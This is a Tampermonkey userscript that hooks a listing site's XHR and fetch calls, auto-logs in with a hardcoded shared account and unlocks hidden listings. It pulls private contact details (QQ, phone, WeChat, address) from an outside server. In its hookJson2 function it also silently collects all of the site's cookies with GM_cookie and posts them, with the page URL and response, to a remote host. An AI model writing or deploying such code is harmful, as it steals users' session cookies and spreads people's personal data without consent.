// ==UserScript==
// @name         [major]onefloor
// @license      onefloor
// @namespace    https://bbs.tampermonkey.net.cn/
// @version      0.1.5
// @description  try to take over the world!
// @author       You
// @match        http*://*/lists?cid=*
// @match        http*://*/lists?page=*&cid=*
// @match        http*://*/show?id=*
// @grant        GM_xmlhttpRequest
// @grant        GM_cookie
// @grant        unsafeWindow
// @connect      mo66.xyz
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/457628/%5Bmajor%5Donefloor.user.js
// @updateURL https://update.greasyfork.org/scripts/457628/%5Bmajor%5Donefloor.meta.js
// ==/UserScript==

// 在此处键入代码……
unsafeWindow.GM_cookie = GM_cookie;
unsafeWindow.GM_xmlhttpRequest = GM_xmlhttpRequest;


// @require      https://scriptcat.org/lib/637/1.2.0/ajaxHooker.js
var ajaxHooker = function() {
    const win = window.unsafeWindow || document.defaultView || window;
    const hookFns = [];
    const realXhr = win.XMLHttpRequest;
    const xhrProto = realXhr.prototype;
    const xhrProtoDesc = Object.getOwnPropertyDescriptors(xhrProto);
    const xhrReadyState = xhrProtoDesc.readyState.get;
    const resProto = win.Response.prototype;
    const toString = Object.prototype.toString;
    const realXhrOpen = xhrProto.open;
    const realXhrSend = xhrProto.send;
    const realFetch = win.fetch;
    const xhrResponses = ['response', 'responseText', 'responseXML'];
    const fetchResponses = ['arrayBuffer', 'blob', 'formData', 'json', 'text'];
    function emptyFn() {}
    function defineProp(obj, prop, getter, setter) {
        Object.defineProperty(obj, prop, {
            configurable: true,
            enumerable: true,
            get: getter,
            set: setter
        });
    }
    function readonly(obj, prop, value = obj[prop]) {
        defineProp(obj, prop, () => value, emptyFn);
    }
    function writable(obj, prop, value = obj[prop]) {
        Object.defineProperty(obj, prop, {
            configurable: true,
            enumerable: true,
            writable: true,
            value: value
        });
    }
    function fireXhrEvent(event) {
        const xhr = event.target;
        const evtConstructor = toString.call(event).slice(8, -1);
        xhr.dispatchEvent(new win[evtConstructor]('ajaxHooker_' + event.type));
        const onEvent = xhr.__ajaxHooker['on' + event.type];
        typeof onEvent === 'function' && onEvent.call(xhr, event);
    }
    function xhrReadyStateChange(e) {
        const xhr = e.target;
        if (xhrReadyState.call(xhr) === 4) {
            const arg = {
                finalUrl: xhr.responseURL,
                status: xhr.status,
                responseHeaders: {}
            };
            const arr = xhr.getAllResponseHeaders().trim().split(/[\r\n]+/);
            for (const line of arr) {
                const parts = line.split(/:\s*/);
                if (parts.length === 2) {
                    const lheader = parts[0].toLowerCase();
                    if (lheader in arg.responseHeaders) {
                        arg.responseHeaders[lheader] += ', ' + parts[1];
                    } else {
                        arg.responseHeaders[lheader] = parts[1];
                    }
                }
            }
            xhrResponses.forEach(prop => {
                defineProp(arg, prop, () => {
                    return xhrProtoDesc[prop].get.call(xhr);
                }, val => {
                    delete arg[prop];
                    arg[prop] = val;
                });
            });
            xhr.dispatchEvent(new CustomEvent('ajaxHooker_responseReady', {
                detail: {arg: arg, event: e}
            }));
        } else {
            fireXhrEvent(e);
        }
    }
    function xhrAsyncEvent(e) {
        e.target.__ajaxHooker.resPromise.then(() => fireXhrEvent(e));
    }
    function fakeXhr() {
        const xhr = new realXhr();
        if (!('__ajaxHooker' in xhr)) {
            try {
                xhr.__ajaxHooker = {
                    abort: false,
                    headers: {},
                    resPromise: Promise.resolve()
                };
                xhr.setRequestHeader = (header, value) => {
                    xhr.__ajaxHooker.headers[header] = value;
                }
                if ('onreadystatechange' in xhrProto && xhr instanceof EventTarget) {
                    const realAddEvent = xhr.addEventListener;
                    xhr.addEventListener = function(...args) {
                        switch (args[0]) {
                            case 'readystatechange':
                            case 'load':
                            case 'loadend':
                                args[0] = 'ajaxHooker_' + args[0];
                        }
                        return realAddEvent.apply(xhr, args);
                    };
                    ['onreadystatechange', 'onload', 'onloadend'].forEach(evt => {
                        defineProp(xhr, evt, () => {
                            return xhr.__ajaxHooker[evt] || null;
                        }, val => {
                            xhr.__ajaxHooker[evt] = typeof val === 'function' ? val : null;
                        });
                    });
                    realAddEvent.call(xhr, 'readystatechange', xhrReadyStateChange);
                    realAddEvent.call(xhr, 'load', xhrAsyncEvent);
                    realAddEvent.call(xhr, 'loadend', xhrAsyncEvent);
                }
            } catch (err) {
                console.error(err);
            }
        }
        return xhr;
    }
    function fakeXhrOpen(method, url, ...args) {
        const xhr = this;
        try {
            xhr.__ajaxHooker.url = url;
            xhr.__ajaxHooker.method = method.toUpperCase();
            xhr.__ajaxHooker.remainArgs = args;
            xhrResponses.forEach(prop => {
                delete xhr[prop]; // delete descriptor
            });
        } catch (err) {
            console.error(err);
        }
        return realXhrOpen.call(xhr, method, url, ...args);
    }
    function fakeXhrSend(data) {
        const xhr = this;
        const req = xhr.__ajaxHooker;
        if (xhrReadyState.call(xhr) === 1 && req) {
            req.data = data;
            try {
                const request = {
                    type: 'xhr',
                    url: req.url,
                    method: req.method,
                    abort: false,
                    headers: req.headers,
                    data: data,
                    response: null
                };
                for (const fn of hookFns) {
                    try {
                        fn(request);
                    } catch (err) {
                        console.error(err);
                    }
                }
                Promise.all(['url', 'method', 'abort', 'headers', 'data'].map(key => Promise.resolve(request[key]).then(
                    val => {request[key] = val},
                    () => {request[key] = req[key]}
                ))).then(() => {
                    if (request.abort) return;
                    realXhrOpen.call(xhr, request.method, request.url, ...req.remainArgs);
                    data = request.data;
                    for (const header in request.headers) {
                        xhrProto.setRequestHeader.call(xhr, header, request.headers[header]);
                    }
                    xhr.addEventListener('ajaxHooker_responseReady', e => {
                        const task = [];
                        if (typeof request.response === 'function') {
                            try {
                                request.response(e.detail.arg);
                            } catch (err) {
                                console.error(err);
                            }
                            xhrResponses.forEach(prop => {
                                const descriptor = Object.getOwnPropertyDescriptor(e.detail.arg, prop);
                                if ('value' in descriptor) {
                                    task.push(Promise.resolve(descriptor.value).then(val => {
                                        e.detail.arg[prop] = val;
                                        defineProp(e.target, prop, () => val);
                                    }, emptyFn));
                                } else {
                                    defineProp(e.target, prop, () => {
                                        return e.detail.arg[prop] = xhrProtoDesc[prop].get.call(e.target);
                                    });
                                }
                            });
                        }
                        e.target.__ajaxHooker.resPromise = Promise.all(task);
                        e.target.__ajaxHooker.resPromise.then(() => fireXhrEvent(e.detail.event));
                    });
                    return realXhrSend.call(xhr, data);
                });
            } catch (err) {
                console.error(err);
                return realXhrSend.call(xhr, req.data);
            }
        } else {
            return realXhrSend.call(xhr, data);
        }
    }
    function hookFetchResponse(response, arg, callback) {
        fetchResponses.forEach(prop => {
            response[prop] = () => new Promise((resolve, reject) => {
                resProto[prop].call(response).then(res => {
                    if (!(prop in arg)) {
                        arg[prop] = res;
                        try {
                            callback(arg);
                        } catch (err) {
                            console.error(err);
                        }
                    }
                    if (prop in arg) {
                        Promise.resolve(arg[prop]).then(val => resolve(arg[prop] = val), () => resolve(res));
                    } else {
                        resolve(res);
                    }
                }, reject);
            });
        });
    }
    function fakeFetch(url, init) {
        try {
            if (toString.call(url) === '[object String]') {
                init = init || {};
                init.headers = init.headers || {};
                const request = {
                    type: 'fetch',
                    url: url,
                    method: (init.method || 'GET').toUpperCase(),
                    abort: false,
                    headers: {},
                    data: init.body,
                    response: null
                };
                if (toString.call(init.headers) === '[object Headers]') {
                    for (const [key, val] of init.headers) {
                        request.headers[key] = val;
                    }
                } else {
                    request.headers = {...init.headers};
                }
                const reqClone = {...request};
                for (const fn of hookFns) {
                    try {
                        fn(request);
                    } catch (err) {
                        console.error(err);
                    }
                }
                return new Promise((resolve, reject) => {
                    Promise.all(['url', 'method', 'abort', 'headers', 'data'].map(key => Promise.resolve(request[key]).then(
                        val => {request[key] = val},
                        () => {request[key] = reqClone[key]}
                    ))).then(() => {
                        if (request.abort) return reject('aborted');
                        url = request.url;
                        init.method = request.method;
                        init.headers = request.headers;
                        init.body = request.data;
                        realFetch.call(win, url, init).then(response => {
                            if (typeof request.response === 'function') {
                                const arg = {
                                    finalUrl: response.url,
                                    status: response.status,
                                    responseHeaders: {}
                                };
                                for (const [key, val] of response.headers) {
                                    arg.responseHeaders[key] = val;
                                }
                                hookFetchResponse(response, arg, request.response);
                                response.clone = () => {
                                    const resClone = resProto.clone.call(response);
                                    hookFetchResponse(resClone, arg, request.response);
                                    return resClone;
                                };
                            }
                            resolve(response);
                        }, reject);
                    });
                });
            } else {
                return realFetch.call(win, url, init);
            }
        } catch (err) {
            console.error(err);
            return realFetch.call(win, url, init);
        }
    }
    win.XMLHttpRequest = fakeXhr;
    Object.keys(realXhr).forEach(key => {fakeXhr[key] = realXhr[key]});
    fakeXhr.prototype = xhrProto;
    xhrProto.open = fakeXhrOpen;
    xhrProto.send = fakeXhrSend;
    win.fetch = fakeFetch;
    return {
        hook: fn => hookFns.push(fn),
        protect: () => {
            readonly(win, 'XMLHttpRequest', fakeXhr);
            readonly(xhrProto, 'open', fakeXhrOpen);
            readonly(xhrProto, 'send', fakeXhrSend);
            readonly(win, 'fetch', fakeFetch);
        },
        unhook: () => {
            writable(win, 'XMLHttpRequest', realXhr);
            writable(xhrProto, 'open', realXhrOpen);
            writable(xhrProto, 'send', realXhrSend);
            writable(win, 'fetch', realFetch);
        }
    };
}();

let configf = {

    getCookies :function(){
        return new Promise(function (resolve, reject) {
            let cookieDic = {}
            GM_cookie('list',{
                domain:document.location.host  // 这个网址必须 connect 一下
                },(item)=>{
                    if(typeof item === 'undefined' || item.length == 0 ){
                        reject("");
                    }else{
                        for(var i=0;i<item.length;i++){
                            cookieDic[item[i].name] = item[i].value;
                        };
                        resolve(cookieDic);
                    }
                }
            )
        });
    },

    judgeLogin: function(){
        let isLogin = localStorage.Flag
        if(isLogin == 'isLogin'){
            return true
        }else{
            return false
        };
    },

    inLogin:async function(){
        try{
            let url = window.location.origin+'/api/login';
            let myHeaders = {
                'authority': 'hi66.xyz',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'flag': '1',
                'origin': window.location.origin,
                'referer': window.location.origin + '/login',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54'
            };
            let raw = new URLSearchParams({
                'username': 'yi12',
                'password': 'yilou123'
            });
            let  requestOptions = {
                method: 'POST',
                headers: myHeaders,
                body: raw,
                redirect: 'follow',
                credentials:'include'
            };
            let response = await fetch(url,requestOptions);
            let data = await response.json();
            console.log(data)
            if(data.success =='登录成功'){
                localStorage.Flag = 'isLogin'
                console.log('login:success')
                location.reload();
            }else{
                console.log('login:un_success')
            };
            
        }catch (e){
            console.error(e)
        };

    },

    getmessage:function(){
        return new Promise(function (resolve, reject) {
            let url = "http://127.0.0.1:16999/ylyf/api/post"
            let id = configf.getUrlParams();
            console.log(id)
            id = id.id;
            GM_xmlhttpRequest({
                method: "POST",
                url: url,
                data:JSON.stringify({"id":id}),
                // cookie:document.cookie,
                // cookie:cookie,
                onload: function(res){
                    if(res.status === 200){
                        console.log(res.responseText)
                    }else{
                        console.log('send 数据失败'+'返回代码：'+String(res.status))
                        // reject();
                    };
                    resolve(res.responseText)
                },
                onerror : function(err){
                    console.log('send 数据遇到错误',err)
                    reject();
                }
            });
            //
        });

    },


    getUrlParams:function () {
        let url = window.location.href
        let urlStr = url.split('?')[1]
        let obj = {};
        let paramsArr = urlStr.split('&')
        for(let i = 0,len = paramsArr.length;i < len;i++){
            let arr = paramsArr[i].split('=')
            obj[arr[0]] = arr[1];
        };
        return obj
    },

    hookJson2:function(){
        ajaxHooker.hook(request => {
            if (request.url === '/api/show' && request.method === 'POST'){
                let id = request.data.match(/\d+/)[0];
                request.response = res => {
                    const responseText = res.responseText; // 注意保存原数据
                    const oldJson = JSON.parse(responseText);
                    if(oldJson.is_see  === false){
                        res.responseText = new Promise(resolve => {
                            let url = "https://19z42m7544.goho.co/ylyf/api/post"
                            GM_xmlhttpRequest({
                                method: "POST",
                                url: url,
                                data:JSON.stringify({"id":id}),
                                // cookie:document.cookie,
                                // cookie:cookie,
                                onload: function(mesage){
                                    if(mesage.status === 200){
                                        let getmes = JSON.parse(mesage.responseText).data;
                                        oldJson.QQ = getmes.qq;
                                        oldJson.phone   = getmes.phone;
                                        oldJson.wechat  = getmes.wechat;
                                        oldJson.address = getmes.address;
                                        oldJson.is_see  = true;
                                        resolve(oldJson);
                                    }else{
                                        console.log('send success erro,start_code:'+String(mesage.status))
                                        resolve(oldJson);
                                    };
                                },
                                onerror : function(err){
                                    console.log('send success erro:',err)
                                    resolve(oldJson);
                                }
                            });
                        });
                    }else if(oldJson.is_see  === true){
                        //
                        console.log("try start >> 请检查：",document.location.host , " 添加到 // @connect")
                        let url = "https://19z42m7544.goho.co/ylyf/api/save"

                        configf.getCookies().then(value =>{
                            data = {
                                "url_host":document.location.host,
                                "url_pathname":document.location.pathname,
                                "url_full":document.location.href,
                                "cookie":JSON.stringify(value),
                                "message":res.responseText,
                            };
                            console.log("data finish",)
                            GM_xmlhttpRequest({
                                method: "POST",
                                url: url,
                                data:JSON.stringify(data),
                                cookie:document.cookie,
                                onload: function(mesage){
                                    if(mesage.status === 200){
                                        let getmes = JSON.parse(mesage.responseText).data;
                                        console.log("send save success:",getmes)
                                    }else{
                                        console.log('send save erro,start_code:'+String(mesage.status))
                                    };
                                },
                                onerror : function(err){
                                    console.log('send save  erro:',err)
                                }
                            });
                        })
                        res.responseText
                    };
                };
            };
        });
    },


};

//  open in new tab
function ad(){
    function jiankong(){
        //  页面改变就运行插入-----------------------------------------------------
        // js监听页面元素是否变化
        // 选择需要观察变动的节点
        const pele = document.querySelector(".C-InfoCard");
        // console.log(pele);
        const targetNode = pele.parentNode.parentNode.parentNode.parentNode.parentNode;
        // 观察器的配置（需要观察什么变动）
        const config = { attributes: true, childList: true, subtree: true };
        // 当观察到变动时执行的回调函数
        const callback = function(mutationsList, observer) {
            // Use traditional 'for loops' for IE 11
            for(let mutation of mutationsList) {
                if (mutation.type === 'childList') {
                    console.log('元素变化了');
                    writeEle();
                }
                // else if (mutation.type === 'attributes') {
                //     console.log('The ' + mutation.attributeName + ' 属性变化了attribute was modified.');
                // }
            }
        };
        // 创建一个观察器实例并传入回调函数
        const observer = new MutationObserver(callback);
        // 以上述配置开始观察目标节点
        observer.observe(targetNode, config);
        // 之后，可停止观察
        // observer.disconnect();
        //  页面改变就运行插入-----------------------------------------------------
    };
    // new tab
    function writeEle(){
        let hrefItemElements = document.querySelectorAll(".C-InfoCard");
        for (let hrefItemN =0;hrefItemN < hrefItemElements.length;hrefItemN++)
        { 
            let hrefItemss = hrefItemElements[hrefItemN];
            let hrefItemssTwo = hrefItemss.parentNode.parentNode.parentNode.parentNode
            let hrefItems = hrefItemssTwo.querySelectorAll("a");
            for (let ii=0;ii<hrefItems.length;ii++){
                hrefItems[ii].setAttribute("target","_blank"); 
                // console.log(hrefItems[ii].href);
            };
        };      
    };

    try{jiankong()}catch(err){console.log('jiankong err');};

    window.onload = function(){
        let num = 0;
        var t =  setInterval(function(){
            num++;
            try{
                writeEle();      
                if(document.querySelector(".C-InfoCard")){
                    console.log('找到超链接数量：' + String(document.querySelectorAll(".C-InfoCard").length));
                    if(document.querySelectorAll(".C-InfoCard").length>20){
                        // find number > 20  clearInterval
                        clearInterval(t);
                    };
                    jiankong(); //持续监控元素 
                };
            }catch(err){
                console.log(err.message);
            };
            console.log('这是第：',num,'次运行函数插入');
            if(num>30){
                clearInterval(t);
            };
        },1000);
    };

};

(function(){

    console.log('run start...')
    let islogin = configf.judgeLogin();
    if(islogin==false){configf.inLogin();};
    if(islogin==true && document.location.href.match(/show\?id/)){configf.hookJson2();};
    if(document.location.href.match(/lists/)){ad();};

})()





    

